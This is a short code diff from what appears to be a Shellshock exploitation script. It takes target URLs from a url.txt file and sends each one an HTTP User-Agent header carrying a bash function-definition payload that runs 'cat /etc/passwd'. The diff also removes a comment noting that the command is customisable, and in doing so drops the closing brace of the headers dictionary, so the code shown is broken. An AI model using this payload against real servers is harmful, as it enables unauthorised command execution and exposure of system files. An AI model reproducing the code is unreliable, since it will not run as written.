@@ -14,8 +14,7 @@ print("将需要检测的url放入同一目录下的url.txt中执行,python3 Son
 
 urllib3.disable_warnings()
 headers = {
-    'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'   #执行的命令可以在脚本中自定义，例如cat /etc/passwd
-}
+    'User-Agent': '() { :; }; echo ; /bin/bash -c "cat /etc/passwd"'
 
 
 def exploit(url):
